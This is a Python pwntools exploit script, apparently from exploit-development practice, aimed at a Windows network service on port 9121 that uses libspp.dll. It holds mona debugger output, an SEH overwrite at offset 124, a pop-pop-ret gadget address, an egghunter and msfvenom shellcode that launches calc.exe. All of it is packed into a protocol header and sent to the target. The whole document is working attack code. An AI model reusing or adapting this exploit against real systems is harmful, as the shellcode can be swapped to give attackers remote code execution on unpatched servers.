#!/usr/bin/python3
from pwn import remote, p32, asm

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 2
Start of chain (TEB FS:[0]) : 0x01c4fe0c
Address     Next SEH    Handler
-------     --------    -------
0x01c4ff44  0x65413165  0x33654132  (record smashed at offset 124)

[+] Command used:
!py mona seh -m libspp.dll
[+] Results :
0x10043ad7 |   0x10043ad7 : pop esi # pop ecx # ret |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (libspp.dll)
"""

offset = 124
junk = b"A" * offset

nseh = asm("jmp $+8").ljust(4, b"A")
seh = p32(0x10043ad7)

# !py mona egghunter -wow64
egg = b"w00t" * 2

egghunter  = b""
egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42"
egghunter += b"\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3"
egghunter += b"\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4"
egghunter += b"\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d'
shellcode =  b""
shellcode += b"\xb8\x3c\xc7\x7e\x34\xda\xd2\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x31\x31\x46\x13\x03\x46\x13"
shellcode += b"\x83\xee\xc0\x25\x8b\xc8\xd0\x28\x74\x31\x20"
shellcode += b"\x4d\xfc\xd4\x11\x4d\x9a\x9d\x01\x7d\xe8\xf0"
shellcode += b"\xad\xf6\xbc\xe0\x26\x7a\x69\x06\x8f\x31\x4f"
shellcode += b"\x29\x10\x69\xb3\x28\x92\x70\xe0\x8a\xab\xba"
shellcode += b"\xf5\xcb\xec\xa7\xf4\x9e\xa5\xac\xab\x0e\xc2"
shellcode += b"\xf9\x77\xa4\x98\xec\xff\x59\x68\x0e\xd1\xcf"
shellcode += b"\xe3\x49\xf1\xee\x20\xe2\xb8\xe8\x25\xcf\x73"
shellcode += b"\x82\x9d\xbb\x85\x42\xec\x44\x29\xab\xc1\xb6"
shellcode += b"\x33\xeb\xe5\x28\x46\x05\x16\xd4\x51\xd2\x65"
shellcode += b"\x02\xd7\xc1\xcd\xc1\x4f\x2e\xec\x06\x09\xa5"
shellcode += b"\xe2\xe3\x5d\xe1\xe6\xf2\xb2\x99\x12\x7e\x35"
shellcode += b"\x4e\x93\xc4\x12\x4a\xf8\x9f\x3b\xcb\xa4\x4e"
shellcode += b"\x43\x0b\x07\x2e\xe1\x47\xa5\x3b\x98\x05\xa3"
shellcode += b"\xba\x2e\x30\x81\xbd\x30\x3b\xb5\xd5\x01\xb0"
shellcode += b"\x5a\xa1\x9d\x13\x1f\x5d\xd4\x3e\x09\xf6\xb1"
shellcode += b"\xaa\x08\x9b\x41\x01\x4e\xa2\xc1\xa0\x2e\x51"
shellcode += b"\xd9\xc0\x2b\x1d\x5d\x38\x41\x0e\x08\x3e\xf6"
shellcode += b"\x2f\x19\x5d\x99\xa3\xc1\x8c\x3c\x44\x63\xd1"

payload  = b""
payload += junk
payload += nseh + seh
payload += egghunter
payload += egg + shellcode
payload += b"B" * (500 - len(payload))

header  = b""
header += p32(0xabba1975)
header += p32(0x3)
header += p32(0x1)
header += p32(len(payload))
header += p32(len(payload))
header += p32(payload[-1])

content = header + payload

shell = remote("Windows", 9121)
shell.sendline(content)
